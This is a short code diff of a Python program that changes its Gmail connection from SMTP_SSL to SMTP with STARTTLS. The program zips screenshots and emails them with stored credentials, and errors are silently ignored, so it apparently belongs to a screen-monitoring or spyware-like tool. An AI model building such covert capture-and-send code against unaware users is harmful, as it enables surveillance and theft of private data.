@@ -121,7 +121,8 @@ def send_report():
             zip_file["Content-Disposition"] = 'attachment; filename="screenshots.zip"'
             msg.attach(zip_file)
 
-        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
+        with smtplib.SMTP('smtp.gmail.com', 587) as smtp_server:
+            smtp_server.starttls()
             smtp_server.login(EMAIL, EMAIL_PASSWORD)
             smtp_server.sendmail(EMAIL, EMAIL, msg.as_string())
 
@@ -178,14 +179,14 @@ def setup():
         msg['From'] = EMAIL
         msg['To'] = EMAIL
 
-        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
+        with smtplib.SMTP('smtp.gmail.com', 587) as smtp_server:
+            smtp_server.starttls()
             smtp_server.login(EMAIL, EMAIL_PASSWORD)
             smtp_server.sendmail(EMAIL, EMAIL, msg.as_string())
     except Exception as e:
         pass
 
 def cleanup():
-
     print("Cleaning up")
 
     if timer is not None:
@@ -212,7 +213,8 @@ def cleanup():
         msg['From'] = EMAIL
         msg['To'] = EMAIL
 
-        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
+        with smtplib.SMTP('smtp.gmail.com', 587) as smtp_server:
+            smtp_server.starttls()
             smtp_server.login(EMAIL, EMAIL_PASSWORD)
             smtp_server.sendmail(EMAIL, EMAIL, msg.as_string())
     except Exception as e:
